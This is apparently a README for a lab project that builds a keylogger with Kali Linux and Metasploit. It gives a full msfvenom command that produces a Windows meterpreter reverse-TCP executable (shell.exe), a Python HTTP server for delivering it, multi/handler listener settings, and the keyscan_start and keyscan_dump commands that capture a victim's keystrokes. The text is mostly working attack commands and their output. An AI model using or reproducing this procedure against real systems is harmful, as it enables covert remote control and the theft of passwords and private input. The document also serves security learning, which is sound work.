# Keylogger Setup Project

## Project Overview
The Keylogger Project delves into the creation of a keylogger using Kali Linux, with a focus on the Metasploit Framework's msfvenom and Meterpreter. The objective is to provide users with hands-on experience in generating payloads, setting up listeners, and exploring the capabilities of Meterpreter in a controlled and ethical environment.

```
ifconfig
```

```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet [REDACTED]  netmask 255.255.255.0  broadcast [REDACTED]
        inet6 [REDACTED]  prefixlen 64  scopeid 0x20<link>
        ether [REDACTED]  txqueuelen 1000  (Ethernet)
        RX packets 1639859  bytes 873793905 (833.3 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1215487  bytes 189420207 (180.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 363  bytes 25152 (24.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 363  bytes 25152 (24.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

## Building a Keylogger with Kali Linux:

The process begins with the creation of a "meterpreter shell" using the ```msfvenom``` command in Kali Linux.
The command generates a payload in the form of an executable file (shell.exe) that establishes a connection with another system when executed.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[REDACTED] LPORT=123 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```
### Command Explaination 
```-p``` = payload  <br>
```LHOST``` = local host (Linux Machine) <br>
```LPORT``` = local port <br>
```-f``` = file format <br>
```-o``` = output file name
```

python -m http.server 8000

```
```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit (multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit (multi/handler) > set LHOST [REDACTED]
LHOST => [REDACTED]
msf6 exploit (multi/handler) > set LPORT 123
LPORT => 123
msf6 exploit(multi/handler) > run
```
## Keylogging Commands:

After successfully establishing a connection, the user can initiate the keylogger with the command meterpreter > keyscan_start.
```
meterpreter > keyscan_start
```
To retrieve captured keystrokes, the command meterpreter > keyscan_dump is used.
```
meterpreter > keyscan_dump
```
